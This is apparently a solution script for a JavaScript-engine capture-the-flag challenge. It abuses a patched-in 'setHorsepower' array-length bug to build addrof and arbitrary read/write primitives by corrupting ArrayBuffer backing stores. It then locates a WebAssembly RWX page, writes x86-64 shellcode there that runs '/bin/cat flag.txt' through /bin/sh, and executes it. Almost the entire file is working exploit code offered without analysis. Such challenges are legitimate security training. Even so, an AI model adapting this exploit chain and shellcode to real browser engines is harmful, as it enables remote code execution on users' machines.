buf = new ArrayBuffer(8);
f64 = new Float64Array(buf);
u32 = new Uint32Array(buf);

function ftoi(val) {
  f64[0] = val;
  return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
}

function itof(val) {
    u32[0] = Number(val & 0xffffffffn);
    u32[1] = Number(val >> 32n);
    return f64[0];
}

// The vulnerability lets you extend the array length if I can remember
let float_arr = [13.37,13.37];
float_arr.setHorsepower(0x500);

let initial_obj = {a:1};
let obj_arr = [initial_obj];
obj_arr.setHorsepower(50);

function addrof(obj) {
 obj_arr[0] = obj;
 return (ftoi(float_arr[10]) >> 32n);
}

let arrBuf1 = new ArrayBuffer(1024);
let arrBuf2 = new ArrayBuffer(1024);

let arrBuf2Addr = addrof(arrBuf2);

// leak base address
let tmp = new Uint8Array(8);
upper = ftoi(float_arr[54]) & 0xffffffffn ;

print(`[+] ArrayBuffer2 address : 0x${((upper << 32n) + arrBuf2Addr - 1n).toString(16)}`);

// leak another address to avoid corruption
metadata = ftoi(float_arr[16]) >> 32n;

// arrBuf1.BackingStore = addrof(arrBuf2)
float_arr[15] = itof(arrBuf2Addr - 1n << 32n);
float_arr[16] = itof((metadata << 32n) + upper);

let view1 = new BigUint64Array(arrBuf1);
metadata2 = view1[3] >> 32n;
// backing store lower is high 32 view1[2]
// backing store higher is low 32 view[3]
//view1[3] = (metadata2 << 32n) + 0x40404040n;
//view1[2] = 0x30303030n << 32n;

let memory = {
   read64(address) {
   // overwrite the backing store of arrBuf2
   lower = address;
   view1[3] = (metadata2 << 32n) + upper;
   view1[2] = lower << 32n;
   // arbitrary read
   let view2 = new BigUint64Array(arrBuf2);
   return view2[0];
  },
  write_full(address, bytes) {
   // overwrite the backing store of arrBuf2
   higher = address >> 32n;
   lower = address & 0xffffffffn;
   view1[3] = (metadata2 << 32n) + higher;
   view1[2] = lower << 32n;
   // arbitrary write
   let view2 = new Uint8Array(arrBuf2);
   view2.set(bytes);
   return;
  }
};

// Create a RWX region
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var fun = wasm_instance.exports.main;

// Leak wasm instance address
let wasm_instance_addr = addrof(wasm_instance) -1n
print(`[+] WASM instance address: 0x${((upper << 32n) + wasm_instance_addr).toString(16)}`);

// Leak RWX region address
let rwx_region_addr = memory.read64(wasm_instance_addr + 0x68n)
print(`[+] RWX region address: 0x${rwx_region_addr.toString(16)}`);

// Write shellcode!
// /bin/cat flag.txt
const str = "\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x12\x00\x00\x00\x2f\x62\x69\x6e\x2f\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05";
const shellcode = Array.from(str, ch => ch.charCodeAt(0));
while(shellcode.length % 8 != 0) {
  shellcode.push(0x90);
}

let payload = new Uint8Array(shellcode);
print("[+] Writing shellcode...");
memory.write_full(rwx_region_addr,payload);

fun();
